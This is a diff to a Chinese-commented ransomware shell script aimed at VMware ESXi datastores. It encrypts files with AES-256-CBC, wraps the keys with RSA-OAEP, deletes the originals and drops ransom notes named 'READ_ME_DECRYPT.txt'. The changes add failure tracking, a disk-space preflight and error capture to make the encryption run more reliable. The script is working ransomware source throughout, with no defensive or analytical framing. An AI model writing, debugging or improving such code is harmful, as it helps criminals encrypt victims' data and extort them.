@@ -96,18 +96,50 @@ write_pubkey(){
 }
 
 # ────────────────────────────────────────
+# 失败原因记录：加密失败绝不能静默
+# ────────────────────────────────────────
+FAILS_FILE=/tmp/.jfails_$$
+note_fail(){ printf '%s\n' "$1" >> "$FAILS_FILE" 2>/dev/null; }
+report_fails(){
+    [ -s "$FAILS_FILE" ] || return 0
+    log "!!! 有文件加密失败，原因统计:"
+    sort "$FAILS_FILE" 2>/dev/null | uniq -c | sort -rn | while read -r C R; do
+        log "!!!   $C 次 — $R"
+    done
+    log "!!! 自查: 可用空间(df -h)、数据存储是否只读、目录可写性"
+    rm -f "$FAILS_FILE"
+}
+
+# ────────────────────────────────────────
+# 空间预检
+# ────────────────────────────────────────
+preflight(){
+    NEED=$1
+    DS=""
+    for D in /vmfs/volumes/*; do [ -d "$D" ] && DS="$D" && break; done
+    [ -n "$DS" ] || return 0
+    AVAIL_KB=$(df -k "$DS" 2>/dev/null | awk 'NR==2{print $4}')
+    [ -n "$AVAIL_KB" ] || return 0
+    NEED_KB=$((NEED/1024))
+    if [ "$AVAIL_KB" -lt $((NEED_KB + NEED_KB/20 + 1024)) ]; then
+        log "!!! 空间预检警告: $DS 可用 $((AVAIL_KB/1024/1024))GB < 需要约 $((NEED_KB/1024/1024))GB"
+        log "!!! 加密需为每个文件额外生成等大的 .jasmin，空间不足会大面积失败"
+    fi
+}
+
+# ────────────────────────────────────────
 # 加密单个文件
 # 格式: [SHA256 32B][AES密文][RSA加密key块][4B key块长度(小端)]
 # ────────────────────────────────────────
 encrypt_file(){
     FILE="$1"
     PUBKEY="$2"
-    [ -f "$FILE" ] || return 1
-    [ -s "$FILE" ] || return 1
+    [ -f "$FILE" ] || { note_fail "文件不存在或不是普通文件"; return 1; }
+    [ -s "$FILE" ] || { note_fail "文件为空(0字节)"; return 1; }
     case "$FILE" in *.jasmin) return 1;; esac
 
-    KEY_HEX=$(openssl rand -hex 32 2>/dev/null) || return 1
-    IV_HEX=$(openssl rand -hex 16 2>/dev/null)  || return 1
+    KEY_HEX=$(openssl rand -hex 32 2>/dev/null) || { note_fail "openssl rand 失败(熵源/openssl异常)"; return 1; }
+    IV_HEX=$(openssl rand -hex 16 2>/dev/null)  || { note_fail "openssl rand 失败(熵源/openssl异常)"; return 1; }
 
     ENC="${FILE}.jasmin"
     T_CT="/tmp/.jct_$$"
@@ -116,16 +148,16 @@ encrypt_file(){
     T_HASH="/tmp/.jhash_$$"
 
     # SHA256 原始文件（原始32字节）
-    sha256_file "$FILE" > "$T_HASH" || { rm -f "$T_HASH"; return 1; }
-    [ -s "$T_HASH" ] || { rm -f "$T_HASH"; return 1; }
+    sha256_file "$FILE" > "$T_HASH" || { note_fail "计算SHA256失败(读取被拒/文件损坏)"; rm -f "$T_HASH"; return 1; }
+    [ -s "$T_HASH" ] || { note_fail "SHA256结果为空"; rm -f "$T_HASH"; return 1; }
 
     # AES-256-CBC 加密（openssl 自动 PKCS7 padding）
     openssl enc -aes-256-cbc -nosalt -in "$FILE" -out "$T_CT" \
-        -K "$KEY_HEX" -iv "$IV_HEX" 2>/dev/null || { rm -f "$T_CT" "$T_HASH"; return 1; }
+        -K "$KEY_HEX" -iv "$IV_HEX" 2>/dev/null || { note_fail "AES加密失败(磁盘空间不足/只读/权限)"; rm -f "$T_CT" "$T_HASH"; return 1; }
 
     # key(32B)+iv(16B) 原始二进制（awk hex2bin，替代缺失的 xxd）
     printf '%s%s' "$KEY_HEX" "$IV_HEX" | hex2bin > "$T_KIV" 2>/dev/null
-    [ -s "$T_KIV" ] || { rm -f "$T_CT" "$T_KIV" "$T_HASH"; return 1; }
+    [ -s "$T_KIV" ] || { note_fail "key/iv 二进制转换失败(hex2bin)"; rm -f "$T_CT" "$T_KIV" "$T_HASH"; return 1; }
 
     # RSA-OAEP 加密 key+iv
     openssl pkeyutl -encrypt -pubin -inkey "$PUBKEY" \
@@ -133,6 +165,7 @@ encrypt_file(){
         -pkeyopt rsa_padding_mode:oaep \
         -pkeyopt rsa_oaep_md:sha256 \
         -pkeyopt rsa_mgf1_md:sha256 2>/dev/null || {
+        note_fail "RSA-OAEP 加密失败(公钥无效或磁盘满)"
         rm -f "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"
         return 1
     }
@@ -140,13 +173,17 @@ encrypt_file(){
     EK_LEN=$(wc -c < "$T_EK" 2>/dev/null)
     [ -n "$EK_LEN" ] || EK_LEN=256
 
-    # 组装
-    {
+    # 组装（重定向失败必须捕获：磁盘满/只读时这里会静默产出空文件）
+    if ! {
         cat "$T_HASH"
         cat "$T_CT"
         cat "$T_EK"
         dec2le "$EK_LEN"
-    } > "$ENC" 2>/dev/null
+    } > "$ENC" 2>/dev/null; then
+        note_fail "写入 .jasmin 失败(磁盘空间不足/只读/权限/inode耗尽)"
+        rm -f "$ENC" "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"
+        return 1
+    fi
 
     rm -f "$T_CT" "$T_KIV" "$T_EK" "$T_HASH"
 
@@ -154,6 +191,7 @@ encrypt_file(){
         rm -f "$FILE"
         return 0
     else
+        note_fail "生成的 .jasmin 为空(磁盘空间不足/只读/inode耗尽)"
         rm -f "$ENC"
         return 1
     fi
@@ -204,7 +242,11 @@ drop_notes(){
         while IFS= read -r D; do
             [ -n "$D" ] || continue
             [ -d "$D" ] || continue
-            printf '%s\n' "$NOTE" > "$D/READ_ME_DECRYPT.txt" 2>/dev/null && WROTE=$((WROTE+1))
+            if printf '%s\n' "$NOTE" > "$D/READ_ME_DECRYPT.txt" 2>/dev/null; then
+                WROTE=$((WROTE+1))
+            else
+                printf '%s\n' "勒索信写入失败(磁盘满/只读): $D" >> "$FAILS_FILE"
+            fi
         done < "$ND.uniq"
         rm -f "$ND.uniq"
         log "勒索信已投放到 $WROTE 个目录"
@@ -266,6 +308,9 @@ main(){
         rm -f "$CL"
     done
     log "发现 $TOTAL 个目标文件，合计 $(fmt_bytes "$TOTAL_BYTES")"
+    [ "$TOTAL" -gt 0 ] || log "提示: 未发现匹配的目标文件(检查 EXTS 白名单)"
+
+    preflight "$TOTAL_BYTES"    # 空间预检
 
     COUNT=0
     SIZE=0
@@ -316,6 +361,7 @@ main(){
     rm -f "$PUBKEY"
 
     log "加密完成: $COUNT/$TOTAL 个文件, $(fmt_bytes "$SIZE") / $(fmt_bytes "$TOTAL_BYTES")"
+    report_fails    # 失败必须可见，否则无从定位
 
     drop_notes "$SID" "$NOTE_DIRS"
     rm -f "$NOTE_DIRS"
